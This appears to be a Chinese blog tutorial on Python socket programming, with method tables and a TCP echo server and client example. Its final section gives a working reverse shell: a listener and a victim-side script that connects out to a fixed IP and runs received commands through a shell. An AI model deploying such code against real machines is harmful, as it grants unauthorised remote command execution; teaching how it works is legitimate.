---
title: Python：Socket编程
author: 简文涛
categories:
  - Python
tags:
  - Socket编程
comments: true
top: false
summary: Socket应用最常见的类型就是客户端/服务器应用，服务器用来等待客户端的链接。socket在传输层和应用层之间。
img: 'https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200608230349.png'
abbrlink: 60850
date: 2020-06-08 22:18:27
updated:
permalink:
password: a7d23a7bb9f6d3401cb9f174cdf6b456920cb99fd2f9587dfb400338a8ec146d
---

## Socket 对象方法

### 服务器端套接字

| 函数       | 描述                                                         |
| :--------- | :----------------------------------------------------------- |
| s.bind()   | 绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。 |
| s.listen() | 开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。 |
| s.accept() | 被动接受TCP客户端连接,(阻塞式)等待连接的到来                 |

### 客户端套接字

| 函数           | 描述                                                    |
| -------------- | ------------------------------------------------------- |
| s.connect()    | 建立与服务器的连接，并开始三次握手                      |
| s.connect_ex() | connect()函数的扩展版本,出错时返回出错码,而不是抛出异常 |

### 公共用途的套接字函数

| 函数         | 描述                                                         |
| ------------ | ------------------------------------------------------------ |
| s.recv()     | 接收TCP数据，数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。 |
| s.send()     | 发送TCP数据，将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。 |
| s.sendall()  | 完整发送TCP数据，完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。 |
| s.recvfrom() | 接收UDP数据，与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。 |
| s.sendto()   | 发送UDP数据，将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。 |
| s.close()    | 关闭套接字                                                   |

## Socket API 的调用顺序和 TCP 的数据流

![sockets-tcp-flow](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200608225928.png)

## 服务端和客户端通信🌰

### 服务端：socket_server.py

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-

import socket
host='' #定义一个socket服务端运行的IP，如果不给默认是运行socket服务器上主机任意的IP地址。
port=18000 #定义的socket服务端的端口号。
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	#socket.AF_INET  服务器之间网络通信
	#socket.SOCK_STREAM 流式socket,TCP进行通信的
	#socket.SOCK_DGRAM  数据报式socket,UDP进行通信的
s.bind((host,port)) #将socket绑定上到地址和端口上。
s.listen(2) #开始监听传入连接。（2代表可以监听2个链接）
conn,addr=s.accept() #从socket客户端接收数据,addr代表的是客户端的IP
print 'got connection from:',addr #输出客户端的IP地址
while 1:
     data=conn.recv(4096) #从客户端接收数据一次性接收4k
     if not data:break #如果data数据接收完了，就跳出这个死循环
     conn.sendall(data.upper()) #将客户端发来的数据变成大写，再发回给客户端
conn.close()#关闭连接
```

### 客户端：socket_client.py

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
import socket
h='192.168.1.110' #socket服务器的IP
p=18000 #socket服务器的端口号
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)#定义socket类型，网络通信，TCP
s.connect((h,p)) #连接socket服务器的IP和端口号
s.send("hello my name is jwt") #向服务端发送数据
received_data = s.recv(1024) #接收来从于SOCKET服务器发给本客户端的数据
s.close()  #关闭socket链接
print "received from server:",received_data #打印从服务端接收过来的数据
```

### 代码测试

```python
1.运行socket服务端:  python socket_server.py    
2.查看程序是否运行:   netstat -tupln
3.运行socket客户端： python socket_client.py 
```
运行结果：

```bash
客户端
# jwt @ pyj in ~ [22:38:32] C:1
$ python socket_client.py
received from server: HELLO MY NAME IS JWT

服务端
kali@kali:~/Desktop$ python socket_server.py 
got connection from: ('192.168.1.109', 2532)
```

## 反弹shell

**控制端：**

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
import socket

host = "0.0.0.0" #监听的地址
port = 8888  #开放监听的端口
server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #创造socket对象
server_socket.bind((host,port)) #确定监听地址和端口
server_socket.listen(5) #启动监听最大连接数为5
print('[+]端口开放在%d' % port)#打印信息
#等待客户端连接,连接成功将客户端套接字对象和连接细节分别保存在client和addr中
client_socket,addr = server_socket.accept()
print('%s:%d连接成功' % (addr[0],addr[1]))#打印信息
#进入循环保持交互
while True:
	command = input("<SHELL:#>")#输入命令
	client_socket.send(command.encode())#将命令发送出去
	data = client_socket.recv(1024)#接收客户端返回的数据
	print (data.decode ("gbk","ignore"))#打印数据
```

**受控端**

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
import socket, subprocess

target_host = "192.168.1.111" #连接目标的ip地址
target_port = 8888 #连接目标的监听端口
client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#建立socket对象
client_socket.connect((target_host,target_port))#建立连接
def run_command (command) : #执行系统命令函数
	command = command.rstrip()#删除字符串末尾的空格
	try:#执行系统命令
		output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
	except:#执行命令错误
		output = b"[-] Filed execute command"
	return output
#进入循环保持交互
while True:
	command = client_socket.recv(1024)#接收传过来的命令
	output = run_command (command.decode())#将命令交给执行命令函数处理
	client_socket.send ( output)#将执行结果返回给服务端
```











## 赞助💰

如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭

<table>
  <tbody>
     <tr>
         <td style="text-align:center;">支付宝支付</td>
         <td style="text-align:center;">微信支付</td>
     </tr>
   <tr>
    <td style="text-align:center;" ><img width="200" src="https://jwt1399.top/medias/reward/alipay.png"></td>    
      <td style="text-align:center;"><img width="200" src="https://jwt1399.top/medias/reward/wechat.png"></td>     
  </tr>
</tbody></table>